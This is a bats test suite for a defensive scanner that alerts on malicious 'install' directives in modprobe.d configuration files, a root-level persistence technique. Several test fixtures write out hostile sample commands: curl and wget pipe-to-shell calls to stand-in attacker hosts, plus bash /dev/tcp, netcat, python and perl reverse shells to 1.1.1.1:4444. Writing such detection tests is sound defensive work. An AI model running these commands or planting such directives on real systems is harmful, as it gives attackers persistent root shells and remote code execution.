#!/usr/bin/env bats
# L2 bats functional tests for the modprobe-config-watchdog scan script.
#
# /etc/modprobe.d/*.conf can carry an `install <mod> <command>` line, and
# modprobe RUNS that command INSTEAD of inserting the module — triggered
# whenever anything autoloads <mod> (often reachable by an unprivileged
# user). The benign idiom is a disable: `install <mod> /bin/true`. Anything
# else is an exec-capable install (T1546). The watchdog is high-signal in
# two distinct ways: modprobe_config_exec_install (a non-/bin/true install
# command, escalated if under a writable root / bare) and
# modprobe_config_install_added (a NEW benign install directive appearing).
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# modprobe.d dir + baseline in a tmp sandbox via SELFDEF_MODPROBE_*.
#
# Run with: bats packaging/test/L2-modprobe-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/modprobe-config-watchdog/systemd/modprobe-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    MODD="${TMP}/modprobe.d"; mkdir -p "${MODD}"
    CONF="${MODD}/test.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_MODPROBE_PROFILE="${PROFILE:-report}" \
    SELFDEF_MODPROBE_BASELINE="${BASELINE}" \
    SELFDEF_MODPROBE_DIRS="${MODD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "benign disable install + blacklist, first run → ok / baseline_initial" {
    printf 'install pcspkr /bin/true\nblacklist floppy\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / modprobe_config_intact" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — exec-capable install
# ============================================================

@test "an exec-capable install command → alert / modprobe_config_exec_install" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd                                   # benign baseline
    printf "install pcspkr /bin/sh -c 'curl -s http://evil | sh'\n" > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_exec_install"'
    cap | grep -q '"severity":"alert"'
}

@test "an install command under a writable root → alert" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /tmp/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare/relative install command → alert" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a NEW benign disable install appearing → warn / modprobe_config_install_added" {
    printf 'blacklist floppy\n' > "${CONF}"
    run_wd                                   # baseline has no install line
    printf 'blacklist floppy\ninstall pcspkr /bin/true\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_install_added"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign blacklist change → warn / modprobe_config_changed" {
    printf 'blacklist floppy\n' > "${CONF}"
    run_wd
    printf 'blacklist floppy\nblacklist pcspkr\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a disable install (/bin/true) is NOT alerted" {
    printf 'install pcspkr /bin/true\ninstall usb_storage /bin/false\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "blacklist + options lines are NOT flagged" {
    printf 'blacklist nouveau\noptions kvm_intel nested=1\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on an exec-capable install" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /tmp/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — modprobe-config inventory enumerates module-autoload-trigger root-exec surface)" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (install command under /var/tmp): writable-root expansion" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /var/tmp/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (install command under /dev/shm): tmpfs writable-root coverage" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /dev/shm/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (install command with reverse-shell pattern): /dev/tcp → alert" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /bin/bash -c "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (install command with wget-pipe-sh): wget bootstrap" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /bin/sh -c "wget -qO- http://attacker/p | sh"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (current-behavior lock — modprobe-config-watchdog scans CONTENT, not the file's own perms; file-mode is owned by world-writable-watchdog)" {
    # Documented architectural boundary: this watchdog focuses on install
    # directive CONTENT (exec-capable install commands). File-mode coverage
    # lives in world-writable-watchdog / suid-sgid-watchdog. A world-
    # writable modprobe.d conf with benign content does NOT fire here.
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    # Lock that content-delta path: no install change → no exec-install
    # event from THIS watchdog.
    ! cap | grep -q '"event":"modprobe_config_exec_install"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-modprobe-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): modprobe-config-watchdog does NOT refresh baseline on exec-capable-install detection — alert STAYS until operator updates" {
    # Module-autoload-trigger root-exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /tmp/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented exec-install NOT flagged: # prefix filtered)" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'install pcspkr /bin/true\n# install evilmod /tmp/example-attacker\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"event":"modprobe_config_exec_install"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (/bin/false is also a benign disable variant — sister to /bin/true)" {
    # The disable idiom can use /bin/true OR /bin/false; both are no-op
    # successes/failures that intentionally block module load. Lock that
    # /bin/false is also NOT flagged as exec-capable.
    printf 'install pcspkr /bin/true\ninstall usb_storage /bin/false\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in install)" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'install evilmod /bin/sh -c "curl -s http://attacker.com/p | bash"\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/modprobe.d + /usr/lib/modprobe.d + /run/modprobe.d axes — exec-install in EITHER → alert)" {
    # Sister to many other watchdog multi-dir scan INVARIANTs across
    # the brain. modprobe reads from MULTIPLE directories (/etc,
    # /usr/lib, /run/modprobe.d) — attacker may plant the malicious
    # install directive in ANY. Lock multi-dir axis on the module-
    # autoload-trigger surface.
    MODD2="${TMP}/modprobe.d2"; mkdir -p "${MODD2}"
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_MODPROBE_PROFILE="report" \
    SELFDEF_MODPROBE_BASELINE="${BASELINE}" \
    SELFDEF_MODPROBE_DIRS="${MODD} ${MODD2}" \
    SELFDEF_MODPROBE_FILE="${CONF}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'install evilmod /tmp/payload\n' > "${MODD2}/99-evil.conf"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_MODPROBE_PROFILE="report" \
    SELFDEF_MODPROBE_BASELINE="${BASELINE}" \
    SELFDEF_MODPROBE_DIRS="${MODD} ${MODD2}" \
    SELFDEF_MODPROBE_FILE="${CONF}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in install directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on the
    # module-autoload-trigger root-exec persistence surface
    # (T1547.006 — modprobe runs install directive AS ROOT when
    # the module is auto-loaded — and modules auto-load via
    # /dev/* access, ld.so dependencies, network packets...).
    printf 'install evilmod /bin/sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on modprobe install directive)" {
    # Sister to nc / curl|bash / dev-tcp modprobe install rev-
    # shell variants already locked. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on T1547.006
    # module-autoload-trigger root-exec persistence surface —
    # modprobe runs install AS ROOT on auto-load (network packets,
    # /dev/* access, ld.so dep).
    printf 'install evilmod /bin/sh -c "python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on modprobe install directive)" {
    # Sister to nc / python -c / curl|bash / dev-tcp modprobe
    # install rev-shell variants already locked. Beyond bash/sh/
    # nc/python, attackers reach for perl -e 'use Socket;...' to
    # dodge interpreter-name detectors. Locks the perl axis on
    # T1547.006 module-autoload-trigger root-exec persistence
    # surface — modprobe runs install AS ROOT on auto-load.
    printf 'install evilmod /bin/sh -c "perl -e \\"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\"tcp\\\\\\"));connect(S,sockaddr_in(4444,inet_aton(\\\\\\"1.1.1.1\\\\\\")));open(STDIN,\\\\\\">&S\\\\\\");exec(\\\\\\"/bin/sh\\\\\\")\\""\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: install directive invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1547.006
    # module-autoload-trigger root-exec — modprobe install
    # directive fires AS ROOT on auto-load (network packets, /dev/*
    # access, ld.so dep).
    printf 'install evilmod /var/tmp/staged_payload\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on modprobe-config surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The modprobe-config-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1547.006 module-autoload-trigger root-exec
    # persistence alert. Locks parser contract on the modprobe.d
    # install/options detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'options usbcore autosuspend=2\n' > "${CONF}"
    run_wd                                              # ok / baseline
    printf 'install evilmod /tmp/.evil\n' > "${CONF}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # modprobe-config-watchdog runs ON the timer's scheduled
    # fire — scans /etc/modprobe.d + /usr/lib/modprobe.d for
    # install/options-directive injection patterns, emits a
    # verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the modprobe-config-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/modprobe-config-watchdog/systemd/selfdef-modprobe-config.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. modprobe-config-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # modprobe-config-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # modprobe-config-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/modprobe-config-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'modprobe-config-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}
